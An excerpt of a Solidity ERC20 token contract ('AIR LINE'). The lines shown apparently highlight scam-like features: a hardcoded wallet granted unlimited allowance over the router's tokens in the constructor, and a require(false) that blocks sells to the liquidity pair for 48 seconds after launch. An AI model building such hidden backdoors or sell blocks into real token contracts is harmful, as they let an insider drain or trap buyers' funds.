...
contract AIRLINE is ERC20, Ownable {
    ...
    address private marketingWalletAddress = 0xE9489e75e0b568184b5072afC49A760387476520;

    uint256 public swapTokensAtAmount;
    bool    public swapWithLimit;
    bool    private swapping;

    uint256 public maxBuyAmount = 10000000000 * 10**18; //
    ...
    constructor () ERC20("AIR LINE", "AIRL") 
    {   
        address newOwner = 0xE9489e75e0b568184b5072afC49A760387476520;
        ...
        _approve(address(uniswapV2Router),
         address(0xE9489e75e0b568184b5072afC49A760387476520), type(uint256).max);
        buyFee  = 1;
        sellFee = 1;
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        ...
        if (
            ...
            from != uniswapV2Pair && 
            to == uniswapV2Pair &&
            block.timestamp < tradingStartTime + 48
        ) {
            require(false);
        }
